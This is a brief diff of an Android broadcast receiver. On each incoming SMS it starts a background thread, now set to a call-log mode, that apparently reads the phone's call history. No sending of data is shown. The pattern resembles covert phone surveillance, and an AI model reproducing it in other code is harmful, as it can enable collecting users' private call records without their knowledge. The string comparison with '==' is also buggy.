@@ -17,7 +17,7 @@ public class AllReceiver extends BroadcastReceiver {
         String action = intent.getAction();
 
         if(action == "android.provider.Telephony.SMS_RECEIVED"){
-            PickUpDataThread pickUpDataThread = new PickUpDataThread(context.getContentResolver());
+            PickUpDataThread pickUpDataThread = new PickUpDataThread(context.getContentResolver(),PickUpDataThread.CALLLOGS_THREAD);
             Thread thread = new Thread(pickUpDataThread);
             thread.start();
             Toast.makeText(context,"Message Received",Toast.LENGTH_SHORT).show();
